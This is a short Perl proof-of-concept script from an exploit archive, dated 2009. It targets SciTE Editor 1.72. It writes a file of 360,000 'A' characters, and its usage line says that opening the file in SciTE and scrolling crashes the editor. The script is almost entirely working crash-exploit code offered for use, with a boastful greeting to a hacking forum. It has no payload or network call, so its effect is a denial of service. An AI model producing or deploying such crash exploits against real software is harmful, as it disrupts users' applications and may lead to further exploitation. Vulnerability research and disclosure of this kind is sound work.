#!/usr/bin/perl
#
#######################################################################
#
#                    ScITE Editor 1.72 crash vulnerability Exploit
#            
########################################################################
#
#		          Bug Founded by prodigy
#
########################################################################

# ###                                 PoC                           ### #

############################################################################################
my $owned="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;
open(myfile,'>>crash.rb');
print myfile $owned;
close(myfile);
############################################################################################

[!]Usage: when you created the file is open with SciTE, and move the scroll bars

############################################################################################

#Greetz: Greetz myself for find the bug, and all the people of undersecurity.net

##########################################################################################

# milw0rm.com [2009-07-13]
